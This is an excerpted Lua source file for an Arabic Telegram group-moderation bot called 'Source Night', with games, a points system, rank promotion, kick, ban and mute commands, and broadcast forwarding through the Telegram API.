if text and text:match("^الغاء$") then 
AliNight:del(Night..'Abs:NameBot'..msg.sender_user_id_)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم الغاء الامر', 1, 'md')
return false 
end 
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حفظ اسم البوت ', 1, 'html')
AliNight:del(Night..'Abs:NameBot'..msg.sender_user_id_)
AliNight:set(Night..'Abs:NameBot', text)
return false 
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.chat_id_ then
...
if tonumber((AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لم تربح اي نقطه\n✯︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙عدد النقاط التي ربحتها ↫ '..(AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then AliNight:del(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم حذف جميع نقاطك', 1, 'md') end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if not AliNight:get(Night..'Abs:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
AliNight:set(Night.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
Ali_Night(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
AliNight:setex(Night.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
Ali_Night(msg.chat_id_, msg.id_, 1,"✯︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
...
SetNum = 'محاولتان فقط'
elseif tonumber(AliNight:get(Night..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
...
if not AliNight:get(Night..'Abs:Lock:Games'..msg.chat_id_) then
AliNight:del(Night.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
AliNight:del(Night..'Abs:ListRolet'..msg.chat_id_)  
AliNight:setex(Night.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and AliNight:get(Night.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "✯︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
AliNight:set(Night.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '✯︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n✯︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
AliNight:del(Night.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and AliNight:get(Night.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if AliNight:sismember(Night..'Abs:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'✯︙المعرف ↫ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
AliNight:sadd(Night..'Abs:ListRolet'..msg.chat_id_,text)
local CountAdd = AliNight:get(Night.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = AliNight:scard(Night..'Abs:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
AliNight:del(Night.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
AliNight:setex(Night.."Abs:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
local Tsl = AliNight:get(Night..'Abs:Tsl')
local Text = [[
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..Abs},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..Abs}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..Abs},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..Abs}},{{text = '⌁ Night TeAM.',url="t.me/sheserlo0"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..Abs},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..Abs}}}
elseif Admin(data) then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "الرابط" then
local Link = AliNight:get(Night..'Abs:Link')
local Text = [[
...
if not AliNight:get(Night..'Abs:Lock:Games'..msg.chat_id_) then
local Games = AliNight:get(Night..'Abs:Games')
local Text = [[
...
AliNight0 = (AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
AliNight:incrby(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,AliNight0)
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙تم بيع '..(AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n✯︙كل نقطه تساوي 50 رساله', 'md')
AliNight:del(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if Abs.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
AliNight:sadd(Night..'Abs:BasicConstructor:'..msg.chat_id_,Manager_id)  
AliNight:sadd(Night..'Abs:AbsConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "معلوماتي" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(AliNight:get(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = AliNight:get(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(AliNight:get(Night..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(AliNight:get(Night..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n✯︙معرفك ↫ ❨ ['..username..'] ❩\n✯︙ايديك ↫ ❨ `'..result.id_..'` ❩\n✯︙نقاطك ↫ ❨ '..user_nkt..' ❩\n✯︙رسائلك ↫ ❨ '..user_msgs..' ❩\n✯︙جهاتك ↫ ❨ '..cont..' ❩\n✯︙تفاعلك ↫ '..formsgs(msguser)..'\n✯︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
...
function NightTEAM(extra,result,success)
if AliNight:get(Night.."Abs:Send:Bot"..Night) and not AbsSudo(msg) then 
send(msg.chat_id_, msg.id_,"✯︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = AliNight:smembers(Night.."Abs:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = AliNight:smembers(Night.."Abs:Users")
...
AliNight:set(Night..'Abs:viewget'..msg.sender_user_id_,true)
...
Text = "✯︙اهلا بك عزيزي \n✯︙عليك اضافة هذا البوت @kg7bot الى مجموعتك\n✯︙ثم رفعه مشرفا ثم اتبع الاوامر التاليه [هـنـا](https://t.me/sheserlo0/6499)"
keyboard = {} 
keyboard.inline_keyboard = {
...
Text = "[⦑ Welcome to Source ⦒](t.me/sheserlo0)\n[✯ ⦑ SOURCE Night ⦒](t.me/sheserlo0)\n✯ Source version : 3.2"
keyboard = {} 
keyboard.inline_keyboard = {
...
if AliNight:get(Night.."Abs:Kick:Me"..msg.chat_id_) then
...
if AliNight:get(Night.."Abs:Del:Me"..msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
...
local user_msgs = AliNight:get(Night..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (AliNight:get(Night..'Abs:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (AliNight:get(Night..'Abs:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (AliNight:get(Night..'Abs:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n✯︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n✯︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n✯︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "تعطيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تعطيل تفاعلي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:del(Night..'Abs:msg:Abs'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local NightTEAM = '✯︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n✯︙تم تفعيل تفاعلي'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, NightTEAM, 14, string.len(msg.sender_user_id_))
AliNight:set(Night..'Abs:msg:Abs'..msg.chat_id_,true)  
end
if AliNight:get(Night.."Abs:msg:Abs"..msg.chat_id_) then
if msg.content_.ID then
get_msg = AliNight:get(Night.."Abs:msg:Abs"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
AliNight:setex(Night..'Abs:msg:Abs'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
function prom_reply(extra, result, success) 
get_msg = AliNight:get(Night.."Abs:msg:Abs"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(AliNight:get(Night..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = AliNight:get(Night..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text == "رتبتي" and ChCheck(msg) then Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ايدي المجموعه" and ChCheck(msg) then Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
...
if tonumber(result.id_) == tonumber(1619263064) then 
Ali_Night(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
...
if tonumber(result.sender_user_id_) == tonumber(Night) then 
Ali_Night(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
...
if tonumber(result.sender_user_id_) == tonumber(1619263064) then  
Ali_Night(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if AliNight:sismember(Night.."Abs:AbsConstructor:"..msg.chat_id_,result.sender_user_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local NightTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
...
if tonumber(result.sender_user_id_) == tonumber(Night) then 
Ali_Night(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
...
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if AliNight:sismember(Night..'Abs:AbsSudo:',result.sender_user_id_) then
Abssudo = 'المطورين الاساسيين • ' else Abssudo = '' end
if AliNight:sismember(Night..'Abs:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if AliNight:sismember(Night..'Abs:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if AliNight:sismember(Night..'Abs:Owner:'..msg.chat_id_, result.sender_user_id_) then
owner = 'المالكين • ' else owner = '' end
if AliNight:sismember(Night..'Abs:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if AliNight:sismember(Night..'Abs:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if AliNight:sismember(Night..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if AliNight:sismember(Night..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if AliNight:sismember(Night..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if AliNight:sismember(Night..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
AliNight:srem(Night..'Abs:AbsSudo:', result.sender_user_id_)
AliNight:srem(Night..'Abs:SecondSudo:', result.sender_user_id_)
AliNight:srem(Night..'Abs:SudoBot:', result.sender_user_id_)
AliNight:srem(Night..'Abs:Owner:'..msg.chat_id_,result.sender_user_id_)
...
if AliNight:sismember(Night..'Abs:AbsSudo:',result.id_) then
Abssudo = 'المطورين الاساسيين • ' else Abssudo = '' end
if AliNight:sismember(Night..'Abs:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if AliNight:sismember(Night..'Abs:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if AliNight:sismember(Night..'Abs:Owner:'..msg.chat_id_, result.id_) then
owner = 'المالكين • ' else owner = '' end
if AliNight:sismember(Night..'Abs:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if AliNight:sismember(Night..'Abs:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if AliNight:sismember(Night..'Abs:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if AliNight:sismember(Night..'Abs:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if AliNight:sismember(Night..'Abs:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if AliNight:sismember(Night..'Abs:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
AliNight:srem(Night..'Abs:AbsSudo:', result.id_)
AliNight:srem(Night..'Abs:SecondSudo:', result.id_)
AliNight:srem(Night..'Abs:SudoBot:', result.id_)
AliNight:srem(Night..'Abs:Owner:'..msg.chat_id_,result.id_)
AliNight:srem(Night..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
AliNight:srem(Night..'Abs:Constructor:'..msg.chat_id_,result.id_)
AliNight:srem(Night..'Abs:Managers:'..msg.chat_id_, result.id_)
AliNight:srem(Night..'Abs:Admins:'..msg.chat_id_, result.id_)
AliNight:srem(Night..'Abs:VipMem:'..msg.chat_id_, result.id_)
AliNight:srem(Night..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'Abssudo' then
AliNight:srem(Night..'Abs:SecondSudo:', result.id_)
AliNight:srem(Night..'Abs:SudoBot:', result.id_)
AliNight:srem(Night..'Abs:Owner:'..msg.chat_id_,result.id_)
...
AliNight:sadd(Night..'Abs:AbsSudo:',result.sender_user_id_)
...
if result.id_ then
AliNight:sadd(Night..'Abs:AbsSudo:',result.id_)
...
AliNight:sadd(Night..'Abs:AbsSudo:',user)
...
AliNight:srem(Night..'Abs:AbsSudo:',user)
...
function promreply(extra,result,success)
if result.id_ then
AliNight:sadd(Night..'Abs:SecondSudo:',result.id_)
...
AliNight:sadd(Night..'Abs:SecondSudo:',user)
...
AliNight:srem(Night..'Abs:SecondSudo:',user)
...
function promreply(extra,result,success)
if result.id_ then
AliNight:sadd(Night..'Abs:SudoBot:',result.id_)
...
AliNight:sadd(Night..'Abs:SudoBot:',user)
...
AliNight:srem(Night..'Abs:SudoBot:',user)
...
AliNight:sadd(Night..'Abs:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
AliNight:sadd(Night..'Abs:Owner:'..msg.chat_id_,result.id_)
...
AliNight:sadd(Night..'Abs:Owner:'..msg.chat_id_,user)
...
AliNight:srem(Night..'Abs:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not AbsConstructor(msg) and AliNight:get(Night.."Abs:Lock:ProSet"..msg.chat_id_) then 
Ali_Night(msg.chat_id_, msg.id_, 1,'✯︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
...
if result.id_ then
AliNight:sadd(Night..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
...
AliNight:sadd(Night..'Abs:BasicConstructor:'..msg.chat_id_,user)
...
AliNight:srem(Night..'Abs:BasicConstructor:'..msg.chat_id_,user)
...
if result.id_ then
AliNight:sadd(Night..'Abs:Constructor:'..msg.chat_id_,result.id_)
...
AliNight:sadd(Night..'Abs:Constructor:'..msg.chat_id_,user)
...
AliNight:srem(Night..'Abs:Constructor:'..msg.chat_id_,user)
...
AliNight:sadd(Night..'Abs:Managers:'..msg.chat_id_,user)
...
AliNight:srem(Night..'Abs:Managers:'..msg.chat_id_,user)
...
if result.id_ then
AliNight:sadd(Night..'Abs:Cleaner:'..msg.chat_id_,result.id_)
...
AliNight:sadd(Night..'Abs:Cleaner:'..msg.chat_id_,user)
...
AliNight:srem(Night..'Abs:Cleaner:'..msg.chat_id_,user)
...
AliNight:sadd(Night..'Abs:Admins:'..msg.chat_id_,user)
...
AliNight:srem(Night..'Abs:Admins:'..msg.chat_id_,user)
...
AliNight:sadd(Night..'Abs:VipMem:'..msg.chat_id_,user)
...
AliNight:srem(Night..'Abs:VipMem:'..msg.chat_id_,user)
...
NightTEAM = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
...
AliNight:del(Night.."Abs:Lock:ProSet"..msg.chat_id_)
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم تفعيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
if text == "تعطيل الرفع" and ChCheck(msg) or text == "تعطيل الترقيه" and ChCheck(msg) then
AliNight:set(Night.."Abs:Lock:ProSet"..msg.chat_id_,"true")
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
--          Kick          --
...
if not AbsConstructor(msg) and AliNight:get(Night.."Abs:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✯︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع طرد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع طرد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
...
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع طرد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
...
if RankChecking(result.sender_user_id_, result.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع حظر ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
...
ChatKick(result.chat_id_, result.sender_user_id_)
AliNight:sadd(Night..'Abs:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and AliNight:get(Night.."Abs:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✯︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع حظر ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
...
ChatKick(msg.chat_id_, result.id_)
AliNight:sadd(Night..'Abs:Ban:'..msg.chat_id_, result.id_)
...
if RankChecking(user, msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع حظر ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"✯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
...
ChatKick(msg.chat_id_, user)
AliNight:sadd(Night..'Abs:Ban:'..msg.chat_id_, user)
...
AliNight:srem(Night..'Abs:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
AliNight:srem(Night..'Abs:Ban:'..msg.chat_id_, result.id_)
...
AliNight:srem(Night..'Abs:Ban:'..msg.chat_id_, user)
...
if not AbsConstructor(msg) and AliNight:get(Night.."Abs:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✯︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","✯︙هو بالفعل مكتوم من المجموعه")  
else
AliNight:sadd(Night..'Abs:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","✯︙هو بالفعل مكتوم من المجموعه")  
else
AliNight:sadd(Night..'Abs:Muted:'..msg.chat_id_, result.id_)
...
if RankChecking(user, msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","✯︙هو بالفعل مكتوم من المجموعه")  
else
AliNight:sadd(Night..'Abs:Muted:'..msg.chat_id_, user)
...
if not AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","✯︙هو ليس مكتوم لالغاء كتمه")  
else
AliNight:srem(Night..'Abs:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","✯︙هو ليس مكتوم لالغاء كتمه")  
else
AliNight:srem(Night..'Abs:Muted:'..msg.chat_id_, result.id_)
...
if not AliNight:sismember(Night..'Abs:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","✯︙هو ليس مكتوم لالغاء كتمه")  
else
AliNight:srem(Night..'Abs:Muted:'..msg.chat_id_, user)
...
if RankChecking(result.sender_user_id_, result.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
AliNight:sadd(Night..'Abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
AliNight:sadd(Night..'Abs:Tkeed:'..msg.chat_id_, result.id_)
...
if RankChecking(user, msg.chat_id_) then
Ali_Night(msg.chat_id_, msg.id_, 1, '✯︙لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
AliNight:sadd(Night..'Abs:Tkeed:'..msg.chat_id_, user)
...
AliNight:srem(Night..'Abs:Tkeed:'..msg.chat_id_, result.id_)
...
AliNight:srem(Night..'Abs:Tkeed:'..msg.chat_id_, user)
...
if AliNight:sismember(Night..'Abs:AbsSudo:',result.sender_user_id_) and not Sudo(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if AliNight:sismember(Night..'Abs:SecondSudo:',result.sender_user_id_) and not AbsSudo(msg) then
Ali_Night(msg.chat_id_, msg.id_, 1, "✯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
...
if AliNight:sismember(Night..'Abs:AbsSudo:',result.id_) and not Sudo(msg) then
